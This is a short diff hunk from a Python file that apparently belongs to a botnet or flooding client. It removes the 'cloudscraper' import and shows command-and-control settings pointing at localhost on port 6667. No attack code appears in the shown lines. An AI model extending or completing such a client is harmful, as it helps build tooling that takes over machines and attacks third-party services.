@@ -1,4 +1,4 @@
-import socket, threading, time, random, cloudscraper, requests
+import socket, threading, time, random, requests
 
 C2_ADDRESS  = "127.0.0.1"
 C2_PORT     = 6667
